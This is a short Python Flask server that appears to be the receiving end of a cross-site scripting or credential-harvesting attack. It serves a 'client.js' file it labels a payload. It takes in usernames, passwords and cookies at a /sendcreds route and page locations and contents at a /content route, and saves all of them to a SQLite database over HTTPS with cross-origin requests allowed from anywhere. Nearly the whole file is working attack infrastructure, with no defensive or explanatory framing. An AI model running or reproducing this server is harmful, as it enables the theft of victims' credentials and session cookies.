#!/usr/bin/python3
from flask import Flask, request, send_file, make_response
from db import create_connection, insert_content, insert_creds, create_db
from flask_cors import CORS
from datetime import date
import time

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"
def writecreds(uname, passwd, cookie):
    insert_creds(uname,passwd,cookie)
@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')
@app.route('/sendcreds', methods=['POST'])
def sendcreds():
    print("[+] Receiving creds")
    uname = request.form.get('username')
    passwd = request.form.get('password')
    cookie = request.form.get('cookie')
    writecreds(uname,passwd,cookie)
    resp = make_response("", 200)
    resp.mimetype = "text/plain"
    return resp
@app.route('/content', methods=['POST'])
def content():
    print("[+] Saving contents to db")
    loc = request.form.get('location')
    cont = request.form.get('content')
    insert_content(loc,cont)
    resp = make_response("", 200)
    resp.mimetype="text/plain"
    return resp
app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
